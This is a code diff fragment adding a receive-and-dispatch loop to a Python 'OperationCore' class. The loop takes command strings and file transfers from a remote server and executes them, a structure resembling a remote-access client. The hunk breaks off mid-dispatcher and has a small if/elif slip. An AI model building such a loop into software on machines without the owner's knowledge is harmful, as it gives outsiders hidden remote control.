@@ -487,3 +487,44 @@ class OperationCore:
         while self.running and self.comm.is_connected:
             # Wait for incoming command
             data, packet_type = self.comm.receive_data()
+            
+            if data is None:
+                print("[CORE] Connection lost or timeout. Attempting reconnect...")
+                if not self.comm.establish_connection():
+                    break
+                continue
+                
+            print(f"[CORE] Received packet type: {packet_type}")
+            
+            if packet_type == "command":
+                self._process_command(data)
+            if packet_type == "file_transfer":
+                self._process_file_transfer(data)
+            elif packet_type == "status":
+                # Ignore status acks, just log
+                print("[CORE] Server acknowledged status.")
+            elif packet_type == "error":
+                print(f"[CORE] Server reported error: {data}")
+                
+            # Small delay between checks
+            time.sleep(0.5)
+            
+    def _process_command(self, payload):
+        """Parses and executes raw command strings or JSON objects sent from the client"""
+        command_str = ""
+        
+        if isinstance(payload, str):
+            command_str = payload
+        elif isinstance(payload, dict):
+            command_str = payload.get("cmd", "")
+            
+        if not command_str:
+            return
+            
+        print(f"[CORE] Executing: {command_str}")
+        
+        # Command Dispacher
+        if command_str == "sys_info":
+            self.sys_mgr.list_directory(".")
+            
+        elif command_str == "cd":
